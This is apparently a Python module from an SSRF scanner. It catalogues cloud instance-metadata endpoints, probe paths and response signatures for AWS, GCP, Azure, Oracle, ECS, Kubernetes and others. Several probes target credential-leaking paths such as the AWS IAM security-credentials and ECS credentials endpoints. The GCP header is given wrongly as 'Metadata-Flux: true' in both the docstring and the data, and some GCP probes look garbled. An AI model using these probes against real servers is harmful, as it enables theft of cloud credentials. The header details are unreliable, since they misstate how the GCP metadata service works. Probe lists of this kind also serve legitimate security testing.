"""Cloud instance-metadata service fingerprints.

Each entry describes how to reach a metadata service and how to recognise a
successful read from inside a compromised host.  Note an honest limitation of
URL-parameter-only injection: Azure IMDS and GCP normally require dedicated
headers (``Metadata: true`` / ``Metadata-Flux: true``) that an attacker cannot
set through a URL parameter alone; those providers are still probed because
legacy/misconfigured deployments respond anyway, and any signature match is
high-signal.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class MetadataEndpoint:
    provider: str
    base_url: str
    probes: tuple[str, ...]
    signatures: tuple[str, ...]
    headers: dict[str, str] = field(default_factory=dict)  # for docs only
    notes: str = ""


AWS = MetadataEndpoint(
    provider="AWS",
    base_url="http://169.254.169.254",
    probes=(
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
        "/latest/user-data",
    ),
    signatures=(
        "ami-id",
        "instance-id",
        "iam/security-credentials",
        "instance-life-cycle",
        "local-ipv4",
    ),
    notes="IMDSv2 (token required) is not exploitable via URL parameter alone; "
    "a v1-style response is what these probes detect.",
)

GCP = MetadataEndpoint(
    provider="GCP",
    base_url="http://metadata.google.internal",
    probes=(
        "/computeMetadata/v1/",
        "/computeMetadata/v1/instance/",
        "/0computeMetadata/v1/instance/",
    ),
    signatures=(
        "computeMetadata",
        "0.1/",
        "instance/machine-type",
        "attestation",
    ),
    headers={"Metadata-Flux": "true"},
    notes="Production GCP requires the Metadata-Flux header; legacy or "
    "internally-proxied deployments may still answer without it.",
)

AZURE = MetadataEndpoint(
    provider="Azure",
    base_url="http://169.254.169.254",
    probes=(
        "/metadata/instance?api-version=2021-02-01",
        "/metadata/instance/network?api-version=2021-02-01",
    ),
    signatures=("compute", "vmId", "subscriptionId", "zone"),
    headers={"Metadata": "true"},
    notes="Requires the Metadata header on current Azure IMDS.",
)

AZURE_WIRE = MetadataEndpoint(
    provider="Azure WireServer",
    base_url="http://168.63.129.16",
    probes=("/machine/?comp=goalstate",),
    signatures=("goalState", "containerId", "instanceId"),
    notes="Azure WireServer endpoints historically leak goal-state XML.",
)

DIGITALOCEAN = MetadataEndpoint(
    provider="DigitalOcean",
    base_url="http://169.254.169.254",
    probes=("/metadata/v1/", "/metadata/v1/id", "/metadata/v1/hostname"),
    signatures=("droplet", "public_ipv4", "region"),
)

ALIBABA = MetadataEndpoint(
    provider="Alibaba Cloud",
    base_url="http://100.100.100.200",
    probes=("/latest/meta-data/", "/latest/meta-data/instance-id"),
    signatures=("instance-id", "region-id", "zone-id"),
)

ORACLE = MetadataEndpoint(
    provider="Oracle Cloud",
    base_url="http://169.254.169.254",
    probes=("/opc/v2/instance/", "/opc/v1/instance/"),
    signatures=("availabilityDomain", "compartmentId", "regionInfo"),
)

# Container orchestrator task metadata (also leaks credentials)
ECS_TASK = MetadataEndpoint(
    provider="AWS ECS",
    base_url="http://169.254.170.2",
    probes=("/v2/credentials/", "/v2/metadata"),
    signatures=("AccessKeyId", "TaskMetadata", "Cluster"),
)

KUBERNETES = MetadataEndpoint(
    provider="Kubernetes",
    base_url="https://kubernetes.default.svc",
    probes=("/api/v1/namespaces/",),
    signatures=("Status", "kind", "apiVersion"),
)

ALL_ENDPOINTS: tuple[MetadataEndpoint, ...] = (
    AWS,
    GCP,
    AZURE,
    AZURE_WIRE,
    DIGITALOCEAN,
    ALIBABA,
    ORACLE,
    ECS_TASK,
    KUBERNETES,
)


def match_signatures(body: str, signatures: tuple[str, ...]) -> list[str]:
    """Return signatures present in ``body`` (case-insensitive)."""
    lowered = body.lower()
    return [sig for sig in signatures if sig.lower() in lowered]
